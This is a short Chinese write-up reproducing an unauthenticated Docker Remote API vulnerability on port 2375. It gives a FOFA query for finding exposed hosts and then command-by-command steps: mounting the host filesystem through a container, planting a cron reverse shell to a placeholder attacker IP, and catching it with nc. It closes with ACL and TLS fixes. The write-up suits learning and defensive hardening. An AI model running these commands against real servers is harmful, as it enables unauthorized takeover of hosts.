Docker Api未授权访问漏洞复现

1 漏洞介绍
    Docker Remote API未授权访问漏洞，此API主要目的是取代命令行界面；
    Dcoker swarm是docker下的分布化应用的本地集群，开放2375监听容器时，会调用这个API，方便的docker集群管理和扩展（绑定在0.0.0.0上，http会返回404page not fount）

2 漏洞成因
dockerd -H unix:///var/run/docker. sock -H 0.0. 0.0:2375docker守护进程监听在0.0.0.0，外网可访问没有使用iptable等限制可连接的来源ip。
3 漏洞概况
fofa语法  port="2375" && protocol="docker"

    访问URL，返回"page not found"存在漏洞

4 漏洞复现
    首先使用docker命令，查看当前镜像信息
docker -H tcp://x.x.x.x:2375 images

    得到镜像的ID信息，接着在宿主机上启动docker容器，挂载到宿主机的var/spool/cron/目录下
docker -H tcp://x.x.x.x:2375 run -it -v /:/var/spool/cron 镜像ID /bin/bash

    之后将反弹shell的脚本写入到/var/spool/cron/root中做一个执行计划
echo '* * * * * bash -i >& /dev/tcp/x.x.x.x/4444 0>&1' >> root

    最后攻击机nc进行监听，成功得到一个反弹的shell，实现了docker逃逸，拿下了该服务器。
nc -lvvp 4444

5 修复建议
1、设置ACL，只允许信任ip连接对应端口2、开启TLS，使用生成的证书进行认证https://docs.docker.com/engine/security/https/
